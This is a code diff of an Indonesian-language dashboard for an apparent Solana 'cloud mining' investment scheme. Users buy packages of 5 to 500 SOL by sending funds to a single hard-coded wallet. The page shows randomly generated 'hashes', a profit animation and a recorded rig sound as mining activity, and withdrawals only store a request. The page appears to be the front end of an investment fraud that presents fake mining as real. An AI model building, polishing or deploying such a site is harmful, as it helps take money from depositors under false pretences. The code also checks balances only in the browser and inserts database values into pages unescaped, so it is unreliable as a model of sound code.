@@ -24,13 +24,10 @@
         .input-field:focus { border-color: #14F195; }
         @keyframes countUp { 0%{opacity:0;transform:translateY(10px);} 100%{opacity:1;transform:translateY(0);} }
         @keyframes hashScroll { 0%{transform:translateX(0);opacity:0.3;} 50%{transform:translateX(-10px);opacity:1;} 100%{transform:translateX(0);opacity:0.3;} }
-        @keyframes hashBlink { 0%,100%{opacity:0.4;} 50%{opacity:1;} }
         .profit-animate { animation:countUp 0.8s ease-out; display:inline-block; }
-        .hash-animate { animation:hashScroll 1s infinite; font-family:monospace; color:#14F195; font-size:0.85rem; letter-spacing:2px; }
         .hash-fast { animation:hashScroll 0.5s infinite; font-family:monospace; color:#14F195; font-size:0.8rem; letter-spacing:1px; }
-        .hash-rate-indicator { animation:hashBlink 1.5s infinite; }
-        .sparkle { animation:hashBlink 0.5s infinite; display:inline-block; position:absolute; font-size:20px; color:#14F195; }
-        .particle-fall { position:absolute; width:4px; height:4px; background:#14F195; border-radius:50%; animation:hashBlink 1.5s infinite; }
+        .sparkle { animation:hashScroll 0.5s infinite; display:inline-block; position:absolute; font-size:20px; color:#14F195; }
+        .particle-fall { position:absolute; width:4px; height:4px; background:#14F195; border-radius:50%; animation:hashScroll 1.5s infinite; }
     </style>
 </head>
 <body>
@@ -60,30 +57,27 @@
         <div id="tab-dashboard" class="tab-content active">
             <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;margin-bottom:28px;">
                 <div class="stat-card"><p style="font-size:12px;color:#94A3B8;">💰 Total Investasi</p><p style="font-size:1.6rem;font-weight:800;color:#9945FF;" id="totalInvest">◎ 0</p></div>
-                <div class="stat-card"><p style="font-size:12px;color:#94A3B8;">📈 Profit Hari Ini</p><p style="font-size:1.6rem;font-weight:800;color:#14F195;" id="profitHarian">◎ 0</p></div>
-                <div class="stat-card"><p style="font-size:12px;color:#94A3B8;">⚡ Hash Rate Aktif</p><p style="font-size:1.6rem;font-weight:800;color:#E2E8F0;" id="hashRate">0 TH/s</p></div>
-                <div class="stat-card"><p style="font-size:12px;color:#94A3B8;">◎ Saldo Tersedia</p><p style="font-size:1.6rem;font-weight:800;color:#14F195;" id="saldoTersedia">◎ 0</p></div>
+                <div class="stat-card"><p style="font-size:12px;color:#94A3B8;">📈 Profit Harian</p><p style="font-size:1.6rem;font-weight:800;color:#14F195;" id="profitHarian">◎ 0</p></div>
+                <div class="stat-card"><p style="font-size:12px;color:#94A3B8;">⚡ Hash Rate</p><p style="font-size:1.6rem;font-weight:800;color:#E2E8F0;" id="hashRate">0 TH/s</p></div>
+                <div class="stat-card"><p style="font-size:12px;color:#94A3B8;">◎ Saldo</p><p style="font-size:1.6rem;font-weight:800;color:#14F195;" id="saldoTersedia">◎ 0</p></div>
             </div>
             <div id="kontrakAktif" class="glass-card" style="margin-bottom:20px;text-align:center;position:relative;overflow:hidden;"></div>
-        </div>
-            <div id="tab-beli" class="tab-content">
+                                                                                                                                                                                            </div>
+                                                                                                                                                                                                <div id="tab-beli" class="tab-content">
         <h2 style="font-size:1.5rem;font-weight:700;margin-bottom:24px;">💳 Beli Kontrak Mining</h2>
-        <p style="text-align:center;color:#94A3B8;margin-bottom:20px;">Klik paket pilihan, transfer SOL, lalu konfirmasi</p>
-        <div style="text-align:center;margin-bottom:24px;">
-            <img src="https://i.ibb.co/QFJdYSRn/bitmain-antminer-s21-1707990232432.png" style="max-width:300px;width:100%;border-radius:12px;border:2px solid rgba(20,241,149,0.3);">
-            <p style="color:#14F195;font-size:12px;margin-top:8px;">⛏️ Rig ASIC Miner kami bekerja 24/7</p>
-        </div>
+        <p style="text-align:center;color:#94A3B8;margin-bottom:20px;">Klik paket, transfer SOL, lalu konfirmasi</p>
+        <div style="text-align:center;margin-bottom:24px;"><img src="https://i.ibb.co/QFJdYSRn/bitmain-antminer-s21-1707990232432.png" style="max-width:300px;width:100%;border-radius:12px;border:2px solid rgba(20,241,149,0.3);"><p style="color:#14F195;font-size:12px;">⛏️ Rig ASIC Miner 24/7</p></div>
         <div style="display:flex;flex-wrap:wrap;justify-content:center;gap:16px;">
             <div class="glass-card" style="flex:1;min-width:200px;max-width:220px;text-align:center;padding:24px 16px;" onclick="beliPaket('Basic','5')"><img src="https://i.ibb.co/QFJdYSRn/bitmain-antminer-s21-1707990232432.png" style="width:60px;height:60px;object-fit:cover;border-radius:8px;margin-bottom:8px;"><p style="font-weight:700;color:#14F195;">BASIC</p><p style="font-size:1.4rem;font-weight:900;">◎ 5 SOL</p></div>
             <div class="glass-card" style="flex:1;min-width:200px;max-width:220px;text-align:center;padding:24px 16px;border-color:rgba(20,241,149,0.4);" onclick="beliPaket('Silver','25')"><img src="https://i.ibb.co/QFJdYSRn/bitmain-antminer-s21-1707990232432.png" style="width:60px;height:60px;object-fit:cover;border-radius:8px;margin-bottom:8px;"><p style="font-weight:700;color:#14F195;">SILVER ⭐</p><p style="font-size:1.4rem;font-weight:900;color:#14F195;">◎ 25 SOL</p></div>
             <div class="glass-card" style="flex:1;min-width:200px;max-width:220px;text-align:center;padding:24px 16px;" onclick="beliPaket('Gold','50')"><img src="https://i.ibb.co/QFJdYSRn/bitmain-antminer-s21-1707990232432.png" style="width:60px;height:60px;object-fit:cover;border-radius:8px;margin-bottom:8px;"><p style="font-weight:700;color:#14F195;">GOLD</p><p style="font-size:1.4rem;font-weight:900;">◎ 50 SOL</p></div>
             <div class="glass-card" style="flex:1;min-width:200px;max-width:220px;text-align:center;padding:24px 16px;" onclick="beliPaket('VIP','250')"><img src="https://i.ibb.co/QFJdYSRn/bitmain-antminer-s21-1707990232432.png" style="width:60px;height:60px;object-fit:cover;border-radius:8px;margin-bottom:8px;"><p style="font-weight:700;color:#14F195;">VIP</p><p style="font-size:1.4rem;font-weight:900;">◎ 250 SOL</p></div>
-            <div class="glass-card" style="flex:1;min-width:200px;max-width:220px;text-align:center;padding:24px 16px;border-color:rgba(153,69,255,0.5);background:linear-gradient(180deg,rgba(153,69,255,0.1) 0%,rgba(17,24,39,0.7) 100%);" onclick="beliPaket('AFF','500')"><img src="https://i.ibb.co/QFJdYSRn/bitmain-antminer-s21-1707990232432.png" style="width:60px;height:60px;object-fit:cover;border-radius:8px;margin-bottom:8px;"><p style="font-weight:700;color:#14F195;">PAKET AFF 🔥</p><p style="font-size:1.4rem;font-weight:900;">◎ 500 SOL</p></div>
+            <div class="glass-card" style="flex:1;min-width:200px;max-width:220px;text-align:center;padding:24px 16px;border-color:rgba(153,69,255,0.5);background:linear-gradient(180deg,rgba(153,69,255,0.1),rgba(17,24,39,0.7));" onclick="beliPaket('AFF','500')"><img src="https://i.ibb.co/QFJdYSRn/bitmain-antminer-s21-1707990232432.png" style="width:60px;height:60px;object-fit:cover;border-radius:8px;margin-bottom:8px;"><p style="font-weight:700;color:#14F195;">PAKET AFF 🔥</p><p style="font-size:1.4rem;font-weight:900;">◎ 500 SOL</p></div>
         </div>
         <div id="beliInfo" class="glass-card" style="display:none;text-align:center;max-width:600px;margin:0 auto;">
             <h3>🔑 Pembayaran <span id="beliPaketNama"></span></h3>
             <p style="color:#94A3B8;">Transfer <strong id="beliJumlah"></strong> ke:</p>
-            <div style="background:rgba(153,69,255,0.1);padding:14px;border-radius:10px;word-break:break-all;font-size:13px;color:#14F195;margin:12px 0;">Ac2oExnWGJBYqVV7vYFuHfjoWx7mJ6Dbf1XyL7GWdXSC</div>
+            <div style="background:rgba(153,69,255,0.1);padding:14px;border-radius:10px;word-break:break-all;font-size:13px;color:#14F195;">Ac2oExnWGJBYqVV7vYFuHfjoWx7mJ6Dbf1XyL7GWdXSC</div>
             <button class="btn-outline btn-sm" onclick="copyWallet()">📋 Copy</button><br>
             <button class="btn-primary" onclick="konfirmasiBeli()">✅ Saya Sudah Transfer</button>
             <p id="beliMsg" style="display:none;color:#14F195;">✅ Menunggu verifikasi admin.</p>
@@ -94,26 +88,13 @@
         <div class="glass-card" style="text-align:center;margin-bottom:24px;padding:40px;"><p style="color:#94A3B8;">💰 Saldo Tersedia</p><p style="font-size:3rem;font-weight:900;color:#14F195;" id="saldoWallet">◎ 0</p></div>
         <div style="display:grid;grid-template-columns:1fr 1fr;gap:20px;">
             <div class="glass-card" style="padding:32px;text-align:center;"><span style="font-size:50px;">📥</span><h3>Deposit SOL</h3><div id="depositStep1"><input type="number" id="jumlahDeposit" class="input-field" placeholder="Jumlah SOL"><button class="btn-primary" onclick="showDepositInfo()">🔑 Lihat Alamat</button></div><div id="depositStep2" style="display:none;"><div style="background:rgba(153,69,255,0.1);padding:14px;border-radius:10px;word-break:break-all;font-size:13px;color:#14F195;">Ac2oExnWGJBYqVV7vYFuHfjoWx7mJ6Dbf1XyL7GWdXSC</div><button class="btn-outline btn-sm" onclick="copyWallet()">📋 Copy</button><button class="btn-primary btn-sm" onclick="depositConfirm()">✅ Saya Sudah Transfer</button><p id="depoUserMsg" style="display:none;color:#14F195;">✅ Menunggu verifikasi...</p></div></div>
-            <div class="glass-card" style="padding:32px;text-align:center;"><span style="font-size:50px;">📤</span><h3>Withdraw SOL</h3><form onsubmit="return false;"><input type="text" id="walletTujuan" class="input-field" placeholder="Alamat Wallet"><input type="number" id="jumlahWithdraw" class="input-field" placeholder="Jumlah SOL"><button type="button" class="btn-primary" onclick="kirimWithdraw()">📤 Kirim</button></form><p id="withdrawMsg" style="display:none;color:#14F195;">✅ Permintaan dikirim.</p><p id="withdrawError" style="display:none;color:#EF4444;">❌ Saldo tidak mencukupi!</p></div>
+            <div class="glass-card" style="padding:32px;text-align:center;"><span style="font-size:50px;">📤</span><h3>Withdraw SOL</h3><form onsubmit="return false;"><input type="text" id="walletTujuan" class="input-field" placeholder="Alamat Wallet"><input type="number" id="jumlahWithdraw" class="input-field" placeholder="Jumlah SOL"><button type="button" class="btn-primary" onclick="kirimWithdraw()">📤 Kirim</button></form><p id="withdrawMsg" style="display:none;color:#14F195;">✅ Permintaan dikirim.</p><p id="withdrawError" style="display:none;color:#EF4444;">❌ Saldo tidak cukup!</p></div>
         </div>
     </div>
-    <div id="tab-mining" class="tab-content">
-        <div class="glass-card" style="text-align:center;padding:40px;">
-            <h2>⛏️ Mining Aktif</h2>
-            <img src="https://i.ibb.co/QFJdYSRn/bitmain-antminer-s21-1707990232432.png" alt="ASIC Miner" style="max-width:350px;width:100%;border-radius:12px;margin-bottom:16px;">
-            <p id="miningInfo" style="color:#94A3B8;">Memuat...</p>
-            <div class="hash-fast" style="margin:12px 0;">⚡ <span id="randomHash">0x8d536a3cdf9c2a...73342cfc0280ab</span></div>
-            <div style="font-size:0.9rem;color:#14F195;margin-top:4px;" class="profit-animate" id="profitUpdate">+0.00000000 SOL</div>
-            <button onclick="var a=document.getElementById('asound');a.play()" style="background:#14F195;color:#000;padding:10px 20px;border-radius:8px;font-weight:700;border:none;cursor:pointer;margin-top:12px;">🔊 Dengarkan Suara Rig ASIC</button>
-            <audio id="asound" style="display:none"><source src="https://raw.githubusercontent.com/mysteaker-web/AFFCLOUDMINING/main/freesound_community-server-31360%20(1).mp3" type="audio/mp3"></audio>
-        </div>
-    </div>
-    <div id="tab-referral" class="tab-content"><div class="glass-card"><h2>👥 Referral</h2><p style="color:#94A3B8;">Kode: <strong id="kodeRef"></strong></p></div></div>
-    <div id="tab-riwayat" class="tab-content">
-        <h2>📜 Riwayat Transaksi</h2>
-        <div class="glass-card" style="overflow-x:auto;"><table style="width:100%;border-collapse:collapse;font-size:13px;"><thead><tr style="border-bottom:1px solid rgba(255,255,255,0.1);"><th style="padding:10px;color:#94A3B8;">Tanggal</th><th style="padding:10px;color:#94A3B8;">Jam</th><th style="padding:10px;color:#94A3B8;">Jenis</th><th style="padding:10px;color:#94A3B8;">Jumlah</th><th style="padding:10px;color:#94A3B8;">Paket</th><th style="padding:10px;color:#94A3B8;">Status</th></tr></thead><tbody id="riwayatTable"><tr><td colspan="6" style="text-align:center;color:#94A3B8;padding:20px;">Memuat data...</td></tr></tbody></table></div>
-    </div>
-    <div id="tab-setting" class="tab-content"><div class="glass-card"><h2>⚙️ Pengaturan</h2><p style="color:#94A3B8;">Nama: <strong id="setNama"></strong></p><p style="color:#94A3B8;">Email: <strong id="setEmail"></strong></p></div></div>
+    <div id="tab-mining" class="tab-content"><div class="glass-card" style="text-align:center;padding:40px;"><h2>⛏️ Mining Aktif</h2><img src="https://i.ibb.co/QFJdYSRn/bitmain-antminer-s21-1707990232432.png" style="max-width:350px;width:100%;border-radius:12px;margin-bottom:16px;"><p id="miningInfo" style="color:#94A3B8;">Memuat...</p><div class="hash-fast">⚡ <span id="randomHash">0x...</span></div><div class="profit-animate" id="profitUpdate">+0.00000000 SOL</div><button onclick="document.getElementById('asound').play()" style="background:#14F195;color:#000;padding:10px 20px;border-radius:8px;font-weight:700;border:none;cursor:pointer;margin-top:12px;">🔊 Suara Rig ASIC</button><audio id="asound" style="display:none"><source src="https://raw.githubusercontent.com/mysteaker-web/AFFCLOUDMINING/main/freesound_community-server-31360%20(1).mp3" type="audio/mp3"></audio></div></div>
+    <div id="tab-referral" class="tab-content"><div class="glass-card"><h2>👥 Referral</h2><p>Kode: <strong id="kodeRef"></strong></p></div></div>
+    <div id="tab-riwayat" class="tab-content"><h2>📜 Riwayat Transaksi</h2><div class="glass-card"><table style="width:100%;font-size:13px;"><thead><tr><th style="padding:10px;color:#94A3B8;">Tanggal</th><th style="padding:10px;color:#94A3B8;">Jam</th><th style="padding:10px;color:#94A3B8;">Jenis</th><th style="padding:10px;color:#94A3B8;">Jumlah</th><th style="padding:10px;color:#94A3B8;">Paket</th><th style="padding:10px;color:#94A3B8;">Status</th></tr></thead><tbody id="riwayatTable"><tr><td colspan="6" style="text-align:center;color:#94A3B8;padding:20px;">Memuat...</td></tr></tbody></table></div></div>
+    <div id="tab-setting" class="tab-content"><div class="glass-card"><h2>⚙️ Pengaturan</h2><p>Nama: <strong id="setNama"></strong></p><p>Email: <strong id="setEmail"></strong></p></div></div>
     </div>
     <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
@@ -132,7 +113,7 @@
         document.querySelectorAll('.nav-item').forEach(function(b){b.classList.remove('active');});
         document.getElementById('tab-'+t).classList.add('active');
         event.target.classList.add('active');
-        if(t==='riwayat'){loadRiwayat();}
+        if(t==='riwayat') loadRiwayat();
     }
 
     function loadUserData(){
@@ -148,11 +129,11 @@
                 document.getElementById('saldoTersedia').textContent='◎ '+saldo;
                 document.getElementById('saldoWallet').textContent='◎ '+saldo;
                 if(status==='Aktif'){
-                    document.getElementById('kontrakAktif').innerHTML='<div style="text-align:center;position:relative;"><img src="https://i.ibb.co/QFJdYSRn/bitmain-antminer-s21-1707990232432.png" style="max-width:300px;width:100%;border-radius:12px;margin-bottom:12px;"><h3 style="color:#14F195;">⛏️ Kontrak Aktif</h3><p style="color:#14F195;">Paket: <strong>'+paket+'</strong></p><p>Hash Rate: '+hashrate+'</p><p>Profit: '+profit+'/hari</p><p style="color:#14F195;">✅ Aktif</p><div class="hash-fast" style="margin-top:8px;">⚡ <span class="hashLive">0x'+randomHash()+'</span></div></div>';
-                    document.getElementById('miningInfo').innerHTML='Paket <strong>'+paket+'</strong> aktif!<br>Hash Rate: '+hashrate+'<br>Profit: '+profit+'/hari';
+                    document.getElementById('kontrakAktif').innerHTML='<div style="text-align:center;"><img src="https://i.ibb.co/QFJdYSRn/bitmain-antminer-s21-1707990232432.png" style="max-width:300px;width:100%;border-radius:12px;margin-bottom:12px;"><h3 style="color:#14F195;">⛏️ Kontrak Aktif</h3><p style="color:#14F195;">Paket: <strong>'+paket+'</strong></p><p>Hash Rate: '+hashrate+'</p><p>Profit: '+profit+'/hari</p><p style="color:#14F195;">✅ Aktif</p><div class="hash-fast">⚡ <span class="hashLive">0x'+randomHash()+'</span></div></div>';
+                    document.getElementById('miningInfo').innerHTML='Paket <strong>'+paket+'</strong> aktif!';
                 } else {
                     document.getElementById('kontrakAktif').innerHTML='<p style="text-align:center;color:#94A3B8;">Belum ada kontrak aktif.</p>';
-                    document.getElementById('miningInfo').textContent='Belum ada kontrak aktif.';
+                    document.getElementById('miningInfo').textContent='Belum ada kontrak.';
                 }
             }
         });
@@ -163,16 +144,16 @@
         db.collection('transactions').where('email','==',userEmail).orderBy('timestamp','desc').limit(50).get().then(function(snapshot){
             var html='';
             if(snapshot.empty){html='<tr><td colspan="6" style="text-align:center;color:#94A3B8;padding:20px;">Belum ada transaksi</td></tr>';}
-            else{snapshot.forEach(function(doc){var t=doc.data();var jb=t.jenis==='Deposit'?'#14F195':(t.jenis==='Withdraw'?'#EF4444':'#F59E0B');var sb=t.status==='Selesai'?'#14F195':'#F59E0B';html+='<tr style="border-bottom:1px solid rgba(255,255,255,0.05);"><td>'+t.tanggal+'</td><td>'+t.jam+'</td><td style="color:'+jb+';font-weight:600;">'+t.jenis+'</td><td>◎ '+t.jumlah+'</td><td>'+t.paket+'</td><td style="color:'+sb+';">'+t.status+'</td></tr>';});}
+            else{snapshot.forEach(function(doc){var t=doc.data();var jb=t.jenis==='Deposit'?'#14F195':(t.jenis==='Withdraw'?'#EF4444':'#F59E0B');var sb=t.status==='Selesai'?'#14F195':'#F59E0B';html+='<tr><td>'+t.tanggal+'</td><td>'+t.jam+'</td><td style="color:'+jb+';font-weight:600;">'+t.jenis+'</td><td>◎ '+t.jumlah+'</td><td>'+t.paket+'</td><td style="color:'+sb+';">'+t.status+'</td></tr>';});}
             document.getElementById('riwayatTable').innerHTML=html;
         });
     }
 
     function beliPaket(nama,jumlah){beliPaketNama=nama;beliJumlah=jumlah;document.getElementById('beliPaketNama').textContent=nama;document.getElementById('beliJumlah').textContent='◎ '+jumlah+' SOL';document.getElementById('beliInfo').style.display='block';}
-    function konfirmasiBeli(){var now=new Date();var tanggal=now.toLocaleDateString('id-ID');var jam=now.toLocaleTimeString('id-ID');db.collection('deposits').add({nama:userNama,email:userEmail,jumlah:beliJumlah,paket:beliPaketNama,status:'Menunggu ACC',tanggal:tanggal});db.collection('transactions').add({email:userEmail,jenis:'Deposit',jumlah:beliJumlah,paket:beliPaketNama,status:'Pending',tanggal:tanggal,jam:jam,timestamp:now.getTime()});document.getElementById('beliMsg').style.display='block';}
+    function konfirmasiBeli(){var now=new Date();var tgl=now.toLocaleDateString('id-ID');var jam=now.toLocaleTimeString('id-ID');db.collection('deposits').add({nama:userNama,email:userEmail,jumlah:beliJumlah,paket:beliPaketNama,status:'Menunggu ACC',tanggal:tgl});db.collection('transactions').add({email:userEmail,jenis:'Deposit',jumlah:beliJumlah,paket:beliPaketNama,status:'Pending',tanggal:tgl,jam:jam,timestamp:now.getTime()});document.getElementById('beliMsg').style.display='block';}
     function showDepositInfo(){var jml=document.getElementById('jumlahDeposit').value;if(!jml||jml<=0){alert('Jumlah!');return;}document.getElementById('depositStep1').style.display='none';document.getElementById('depositStep2').style.display='block';}
     function copyWallet(){navigator.clipboard.writeText('Ac2oExnWGJBYqVV7vYFuHfjoWx7mJ6Dbf1XyL7GWdXSC');alert('✅ Dicopy!');}
-    function depositConfirm(){var jumlah=document.getElementById('jumlahDeposit').value;var now=new Date();var tanggal=now.toLocaleDateString('id-ID');var jam=now.toLocaleTimeString('id-ID');db.collection('deposits').add({nama:userNama,email:userEmail,jumlah:jumlah,status:'Menunggu ACC',tanggal:tanggal});db.collection('transactions').add({email:userEmail,jenis:'Deposit',jumlah:jumlah,paket:'-',status:'Pending',tanggal:tanggal,jam:jam,timestamp:now.getTime()});document.getElementById('depoUserMsg').style.display='block';}
+    function depositConfirm(){var jumlah=document.getElementById('jumlahDeposit').value;if(!jumlah||jumlah<=0){alert('Jumlah!');return;}var now=new Date();var tgl=now.toLocaleDateString('id-ID');var jam=now.toLocaleTimeString('id-ID');db.collection('deposits').add({nama:userNama,email:userEmail,jumlah:jumlah,status:'Menunggu ACC',tanggal:tgl});db.collection('transactions').add({email:userEmail,jenis:'Deposit',jumlah:jumlah,paket:'-',status:'Pending',tanggal:tgl,jam:jam,timestamp:now.getTime()});document.getElementById('depoUserMsg').style.display='block';document.getElementById('depoUserMsg').textContent='✅ Deposit '+jumlah+' SOL menunggu verifikasi.';}
     function kirimWithdraw(){var wallet=document.getElementById('walletTujuan').value.trim();var jumlah=parseFloat(document.getElementById('jumlahWithdraw').value.trim());document.getElementById('withdrawError').style.display='none';document.getElementById('withdrawMsg').style.display='none';if(!wallet||!jumlah){alert('Isi semua!');return;}var saldo=parseFloat(document.getElementById('saldoWallet').textContent.replace('◎','').trim());if(jumlah>saldo){document.getElementById('withdrawError').style.display='block';return;}var now=new Date();db.collection('withdraw').add({nama:userNama,email:userEmail,jumlah:jumlah.toString(),wallet:wallet,tanggal:now.toLocaleDateString('id-ID')});db.collection('transactions').add({email:userEmail,jenis:'Withdraw',jumlah:jumlah.toString(),paket:'-',status:'Diproses',tanggal:now.toLocaleDateString('id-ID'),jam:now.toLocaleTimeString('id-ID'),timestamp:now.getTime()});document.getElementById('withdrawMsg').style.display='block';document.getElementById('walletTujuan').value='';document.getElementById('jumlahWithdraw').value='';}
     function logout(){localStorage.removeItem('aff_user_nama');localStorage.removeItem('aff_user_email');window.location.href='login.html';}
     loadUserData();
